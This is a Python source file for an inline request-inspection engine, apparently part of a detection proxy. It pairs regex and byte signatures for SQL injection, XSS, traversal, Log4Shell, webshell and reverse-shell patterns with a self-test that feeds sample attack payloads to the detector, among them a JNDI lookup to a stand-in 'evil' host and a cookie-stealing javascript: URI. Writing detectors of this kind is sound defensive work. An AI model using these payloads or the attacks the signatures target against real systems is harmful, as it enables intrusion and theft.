#!/usr/bin/env python3
"""
malicious.py  --  inline payload inspection engine (LAPTOP 1)
==============================================================

Runs inside the detection proxy, i.e. *before* anything reaches the protected
origin server.  Pure standard library, no dependencies, no I/O: given the raw
bytes of a request it returns a list of findings.

Detection layers
----------------
1. Regex signatures   : SQLi, XSS, path traversal, command injection, SSRF,
                        XXE, SSTI, Log4Shell, CRLF injection, webshells.
2. Byte signatures    : EICAR test file, NOP sleds, shellcode prologues,
                        PowerShell encoded commands, cmd.exe abuse.
3. Header anomalies   : scanner User-Agents, oversized headers, CRLF in
                        header values.
4. Entropy analysis   : packed / encrypted blobs (high Shannon entropy).
5. Nested encoding    : base64 blobs are decoded and re-scanned (depth 2),
                        URL-encoded payloads are decoded and re-scanned.

Each finding is a dict:
    {"rule": "SQLI-001", "category": "sql_injection",
     "severity": "high", "detail": "union select", "field": "query"}
"""

from __future__ import annotations

import base64
import binascii
import math
import re
import urllib.parse
from dataclasses import dataclass

SEVERITY_ORDER = {"low": 1, "medium": 2, "high": 3, "critical": 4}


@dataclass(frozen=True)
class Rule:
    rule_id: str
    category: str
    severity: str
    pattern: re.Pattern
    detail: str


def _r(rule_id, category, severity, pattern, detail, flags=re.IGNORECASE):
    return Rule(rule_id, category, severity, re.compile(pattern, flags), detail)


REGEX_RULES: list[Rule] = [
    # ---------------- SQL injection ----------------
    _r("SQLI-001", "sql_injection", "high",
       r"(?:'|\%27|`)\s*(?:or|and)\s+(?:'|\%27)?\d*(?:'|\%27)?\s*=\s*(?:'|\%27)?\d*",
       "boolean-based SQLi (OR 1=1)"),
    _r("SQLI-002", "sql_injection", "critical",
       r"union(?:\s|\+|/\*.*?\*/)+select", "UNION SELECT"),
    _r("SQLI-003", "sql_injection", "high",
       r"\b(?:sleep|benchmark|pg_sleep)\s*\(", "time-based SQLi function"),
    _r("SQLI-004", "sql_injection", "high",
       r"information_schema|sysobjects|xp_cmdshell|load_file\s*\(|into\s+outfile",
       "database metadata / file access"),
    _r("SQLI-005", "sql_injection", "medium",
       r"(?:'|\%27)\s*(?:--|#|\/\*)", "SQL comment terminator"),
    _r("SQLI-006", "sql_injection", "high",
       r"concat\s*\(|group_concat\s*\(|extractvalue\s*\(|updatexml\s*\(",
       "SQLi extraction function"),

    # ---------------- Cross-site scripting ----------------
    _r("XSS-001", "xss", "high", r"<\s*script[^>]*>", "<script> tag"),
    _r("XSS-002", "xss", "high", r"javascript\s*:", "javascript: URI"),
    _r("XSS-003", "xss", "high", r"on(?:error|load|mouseover|focus|click)\s*=",
       "inline event handler"),
    _r("XSS-004", "xss", "medium", r"<\s*(?:iframe|object|embed|svg)\b", "active HTML element"),
    _r("XSS-005", "xss", "medium", r"document\.(?:cookie|location)|window\.location",
       "DOM access / redirect"),

    # ---------------- Path traversal / LFI ----------------
    _r("TRAV-001", "path_traversal", "high",
       r"(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e/|\.\.%2f|%252e%252e)", "directory traversal"),
    _r("TRAV-002", "path_traversal", "critical",
       r"/etc/(?:passwd|shadow|hosts)|/proc/self/environ|boot\.ini|win\.ini|/windows/system32",
       "sensitive file access"),

    # ---------------- Command injection ----------------
    _r("CMDI-001", "command_injection", "critical",
       r"[;|&`]\s*(?:cat|ls|id|whoami|wget|curl|nc|ncat|bash|sh|python|perl|powershell)\b",
       "shell command chain"),
    _r("CMDI-002", "command_injection", "high", r"\$\([^)]{1,80}\)", "$() command substitution"),
    _r("CMDI-003", "command_injection", "high", r"`[^`\r\n]{1,80}`", "backtick command substitution"),

    # ---------------- SSRF / XXE / SSTI ----------------
    _r("SSRF-001", "ssrf", "critical",
       r"https?://(?:169\.254\.169\.254|127\.0\.0\.1|localhost|\[::1\])|metadata\.google\.internal",
       "internal/metadata address"),
    _r("SSRF-002", "ssrf", "high", r"\b(?:file|gopher|dict|ftp|ldap)://", "non-HTTP scheme"),
    _r("XXE-001", "xxe", "critical", r"<!ENTITY|SYSTEM\s+[\"'](?:file|http)", "XML external entity"),
    _r("SSTI-001", "ssti", "high",
       r"\{\{\s*\d+\s*\*\s*\d+\s*\}\}|\$\{\s*\d+\s*\*\s*\d+\s*\}|#\{\s*\d+\s*\*\s*\d+\s*\}",
       "template expression evaluation"),

    # ---------------- Log4Shell / CRLF / smuggling ----------------
    _r("LOG4J-001", "log4shell", "critical", r"\$\{jndi:(?:ldap|rmi|dns|http)", "Log4Shell JNDI lookup"),
    _r("CRLF-001", "header_injection", "high", r"%0d%0a|%0a%0d|\r\n(?:Set-Cookie|Location)\s*:",
       "CRLF / response splitting"),
    _r("SMUG-001", "request_smuggling", "high",
       r"transfer-encoding\s*:\s*chunked.*content-length|content-length\s*:.*transfer-encoding",
       "conflicting length headers", re.IGNORECASE | re.DOTALL),

    # ---------------- Webshell / RCE artefacts ----------------
    _r("WEBSHELL-001", "webshell", "critical",
       r"\b(?:eval|assert|system|exec|shell_exec|passthru|popen|proc_open)\s*\(",
       "code execution function"),
    _r("WEBSHELL-002", "webshell", "high", r"base64_decode\s*\(|gzinflate\s*\(|str_rot13\s*\(",
       "obfuscated payload decoder"),
    _r("REVSH-001", "reverse_shell", "critical",
       r"(?:bash|sh)\s+-i\s+>&|nc\s+-e\s+/bin/(?:ba)?sh|/dev/tcp/\d",
       "reverse shell one-liner"),

    # ---------------- Recon / scanner fingerprints ----------------
    _r("SCAN-001", "scanner", "medium",
       r"(?:sqlmap|nikto|nmap|masscan|zgrab|hydra|dirbuster|gobuster|wpscan|metasploit|acunetix|nessus)",
       "attack tool fingerprint"),
    _r("SCAN-002", "scanner", "low", r"\.(?:php|asp|aspx|jsp|cgi)(?:\?|$).*(?:/etc/|\.\./)",
       "scanner probe pattern"),
]

BYTE_RULES: list[tuple[str, str, str, bytes, str]] = [
    ("MAL-001", "malware", "critical",
     b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
     "EICAR antivirus test file"),
    ("MAL-002", "shellcode", "critical", b"\x90" * 24, "NOP sled (24+ x 0x90)"),
    ("MAL-003", "shellcode", "high", b"\xeb\xfe", "infinite-loop shellcode stub"),
    ("MAL-004", "malware", "high", b"cmd.exe /c", "Windows command shell invocation"),
    ("MAL-005", "malware", "high", b"powershell -enc", "PowerShell encoded command"),
    ("MAL-006", "malware", "high", b"powershell.exe -nop -w hidden", "hidden PowerShell"),
    ("MAL-007", "malware", "medium", b"MZ\x90\x00\x03\x00\x00\x00", "PE executable header in payload"),
    ("MAL-008", "malware", "medium", b"\x7fELF\x02\x01\x01", "ELF executable in payload"),
]

# User-Agent values that are almost always automated attack tooling.
# Real attack tooling -> medium severity (blocked by default policy).
SUSPICIOUS_UA = re.compile(
    r"(?:sqlmap|nikto|nmap|masscan|zgrab|hydra|dirbuster|gobuster|wpscan|metasploit|acunetix|nessus)",
    re.IGNORECASE)

# Generic HTTP clients -> low severity (logged, never blocked on their own).
TOOL_UA = re.compile(
    r"(?:curl/|wget/|python-requests|python-urllib|go-http-client|libwww-perl|httpie)",
    re.IGNORECASE)

B64_BLOB = re.compile(rb"[A-Za-z0-9+/]{40,}={0,2}")


def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    ent = 0.0
    for c in counts:
        if c:
            p = c / n
            ent -= p * math.log2(p)
    return ent


def _scan_text(text: str, field: str, findings: list[dict], seen: set) -> None:
    for rule in REGEX_RULES:
        m = rule.pattern.search(text)
        if m:
            key = (rule.rule_id, field)
            if key in seen:
                continue
            seen.add(key)
            findings.append({
                "rule": rule.rule_id,
                "category": rule.category,
                "severity": rule.severity,
                "detail": rule.detail,
                "field": field,
                "match": m.group(0)[:120],
            })


def _scan_bytes(raw: bytes, field: str, findings: list[dict], seen: set) -> None:
    for rule_id, category, severity, needle, detail in BYTE_RULES:
        if needle in raw:
            key = (rule_id, field)
            if key in seen:
                continue
            seen.add(key)
            findings.append({
                "rule": rule_id,
                "category": category,
                "severity": severity,
                "detail": detail,
                "field": field,
                "match": needle[:40].decode("latin-1", "replace"),
            })


def _decode_and_rescan(text: str, field: str, findings: list[dict], seen: set, depth: int) -> None:
    """Look for nested encodings: URL-encoding and base64 blobs."""
    if depth <= 0:
        return

    if "%" in text:
        try:
            decoded = urllib.parse.unquote_plus(text)
            if decoded != text:
                _scan_text(decoded, f"{field}:url-decoded", findings, seen)
                _decode_and_rescan(decoded, f"{field}:url-decoded", findings, seen, depth - 1)
        except Exception:
            pass

    for m in B64_BLOB.finditer(text.encode("latin-1", "replace")):
        blob = m.group(0)
        try:
            decoded = base64.b64decode(blob + b"=" * (-len(blob) % 4), validate=True)
        except (binascii.Error, ValueError):
            continue
        if len(decoded) < 12:
            continue
        try:
            as_text = decoded.decode("utf-8")
            printable_ratio = sum(c.isprintable() or c in "\r\n\t" for c in as_text) / max(len(as_text), 1)
            if printable_ratio > 0.85:
                _scan_text(as_text, f"{field}:base64-decoded", findings, seen)
                _decode_and_rescan(as_text, f"{field}:base64-decoded", findings, seen, depth - 1)
        except UnicodeDecodeError:
            _scan_bytes(decoded, f"{field}:base64-decoded", findings, seen)


def inspect(headers: dict[str, str] | None = None,
            body: bytes = b"",
            path: str = "",
            method: str = "") -> list[dict]:
    """Inspect one request. Returns a list of findings (possibly empty)."""
    findings: list[dict] = []
    seen: set = set()
    headers = headers or {}

    target = f"{method} {path}"
    _scan_text(target, "request_line", findings, seen)
    _decode_and_rescan(path, "path", findings, seen, depth=2)

    ua = headers.get("user-agent", "")
    if ua and SUSPICIOUS_UA.search(ua):
        findings.append({
            "rule": "SCAN-003", "category": "scanner", "severity": "medium",
            "detail": "attack tooling User-Agent", "field": "user-agent",
            "match": ua[:80],
        })
    elif ua and TOOL_UA.search(ua):
        findings.append({
            "rule": "SCAN-004", "category": "scanner", "severity": "low",
            "detail": "automated HTTP client User-Agent", "field": "user-agent",
            "match": ua[:80],
        })
    for hname, hvalue in headers.items():
        if "\r" in hvalue or "\n" in hvalue:
            findings.append({
                "rule": "CRLF-002", "category": "header_injection", "severity": "high",
                "detail": "CR/LF inside header value", "field": hname, "match": hvalue[:80],
            })
        if hname in ("referer", "x-forwarded-for", "cookie", "host", "origin"):
            _scan_text(hvalue, hname, findings, seen)
            _decode_and_rescan(hvalue, hname, findings, seen, depth=1)
    if len(ua) > 1024:
        findings.append({
            "rule": "ANOM-001", "category": "anomaly", "severity": "low",
            "detail": "oversized User-Agent", "field": "user-agent", "match": f"{len(ua)} bytes",
        })

    if body:
        _scan_bytes(body, "body", findings, seen)
        try:
            text = body.decode("utf-8")
            _scan_text(text, "body", findings, seen)
            _decode_and_rescan(text, "body", findings, seen, depth=2)
        except UnicodeDecodeError:
            ent = shannon_entropy(body[:4096])
            if ent > 7.2 and len(body) > 256:
                findings.append({
                    "rule": "ENT-001", "category": "obfuscation", "severity": "low",
                    "detail": "high-entropy (packed/encrypted) binary body",
                    "field": "body", "match": f"entropy={ent:.2f}",
                })

    return findings


def summarize(findings: list[dict]) -> tuple[str, str]:
    """Return (verdict, severity) where verdict is 'allow' or 'block'."""
    if not findings:
        return "allow", "none"
    worst = max(findings, key=lambda f: SEVERITY_ORDER.get(f["severity"], 0))
    severity = worst["severity"]
    verdict = "block" if SEVERITY_ORDER.get(severity, 0) >= 2 else "allow"
    return verdict, severity


if __name__ == "__main__":  # tiny self-test
    samples = [
        ("GET /?id=1' OR '1'='1 HTTP/1.1", {}, b""),
        ("GET /../../etc/passwd HTTP/1.1", {}, b""),
        ("POST /login", {"user-agent": "sqlmap/1.7"}, b'{"u":"admin\'--"}'),
        ("POST /upload", {}, b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
        ("GET /?q=<script>alert(1)</script>", {}, b""),
        ("GET /?x=${jndi:ldap://evil/a}", {}, b""),
        ("GET /?next=javascript:alert(document.cookie)", {}, b""),
        ("GET /?ip=http://169.254.169.254/latest/meta-data", {}, b""),
        ("POST /upload", {}, b"aGVsbG8gYmFzZTY0IHdvcmxkIHRoaXMgaXMgbm90IG1hbGljaW91cw=="),
        ("GET /index.html", {"user-agent": "Mozilla/5.0"}, b""),
    ]
    for line, hdrs, body in samples:
        parts = line.split(" ", 2)
        target = parts[1] if len(parts) > 1 else ""
        if len(parts) > 2:
            target += " " + parts[2]
        f = inspect(hdrs, body, target, parts[0])
        v, s = summarize(f)
        print(f"{line[:48]:50s} -> {v:5s} {s:8s} {[x['rule'] for x in f]}")
